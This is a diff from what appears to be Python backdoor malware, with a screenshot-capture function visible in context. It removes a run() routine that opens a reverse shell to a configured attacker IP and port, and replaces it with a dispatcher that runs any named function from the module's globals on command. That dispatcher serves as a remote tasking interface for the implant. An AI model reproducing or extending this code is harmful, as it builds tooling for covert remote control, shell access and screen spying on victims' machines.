@@ -91,17 +91,24 @@ def take_screenshot(conn, filename):
         print(f"[ERROR] Screenshot failed: {e}")
 
 
-def run(config):
-    attacker_ip = config.get("attacker_ip")
-    attacker_port = config.get("attacker_port")
-
-    if not attacker_ip or not attacker_port:
-        print("[ERROR] missing necessary params")
-        return {"status": "error", "message": "Missing config for attacker_ip or attacker_port"}
-
-    print(f"[INFO] starting backdoor to {attacker_ip}:{attacker_port}...")
-    reverse_shell(attacker_ip, attacker_port)
-    return {"status": "success", "message": "Backdoor executed"}
+def run(functions):
+    results = {}
+    for func_name, params in functions.items():
+        try:
+            target_function = globals().get(func_name)
+            if not callable(target_function):
+                results[func_name] = "Function not found"
+                print(f"[ERROR] Function '{func_name}' not found.")
+                continue
+            if isinstance(params, list):
+                results[func_name] = target_function(*params)
+            else:
+                results[func_name] = target_function()
+            print(f"[INFO] Executed {func_name}: {results[func_name]}")
+        except Exception as e:
+            print(f"[ERROR] Failed to execute {func_name}: {e}")
+            results[func_name] = f"Error: {e}"
+    return {"status": "success", "results": results}
 
 
 if __name__ == "__main__":
